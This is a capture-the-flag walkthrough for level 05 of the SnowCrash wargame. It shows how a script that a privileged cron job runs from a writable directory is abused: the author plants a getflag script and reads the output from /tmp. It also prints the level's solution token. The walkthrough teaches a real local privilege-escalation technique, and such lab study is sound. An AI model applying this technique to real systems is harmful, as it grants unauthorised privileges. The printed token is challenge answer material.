# LEVEL 05 - Im on the list

```shell
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```

```shell
level05@SnowCrash:~$ find / -user level05 2> /dev/null | grep -v proc # Looking for all user's files (Without Kernel noise)
/dev/pts/0

level05@SnowCrash:~$ find / -user flag05 2> /dev/null | grep -v proc
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

After we found two files owned by `flag05` we will need to see their permissions. 

```shell
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver 
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver # The + at the ends of the rights tell us that one ACL(Access control list) is on this file.

level05@SnowCrash:~$ ls -la /rofs/usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
```

After we found the presence of `ACL` on a file owned by `flag05` lets watch it.

```shell
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

## Deduction

1. this script iterate all `files` inside `/opt/openarenaserver/*` and execute them one by one.
2. it has `server` in it and use `system commands`.
3. Maybe this script is runned by a cron jobs.

Lets try it by putting a script containing `getflag` call in this folder.

```shell
level05@SnowCrash:~$ echo "getflag" > /opt/openarenaserver/script.sh
```

```shell
level05@SnowCrash:~$ ls /opt/openarenaserver/
script.sh
level05@SnowCrash:~$ ls /opt/openarenaserver/
# after a few seconds the folder was empty
```

Once we saw that the file has been executed (because it was deleted by `rm -f "$i"`), we can redirect output to a file to read it.

```shell
level05@SnowCrash:~$ echo "getflag > /tmp/flageolet" >  /opt/openarenaserver/script.sh
```
> from here just wait that the script has been deleted.

```shell
level05@SnowCrash:~$ ls /opt/openarenaserver/
script.sh
```

after a few second you should see your new `/tmp/flageolet` file. Enjoy 

```shell
level05@SnowCrash:~$ ls /opt/openarenaserver/
level05@SnowCrash:~$ cat /tmp/flageolet
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
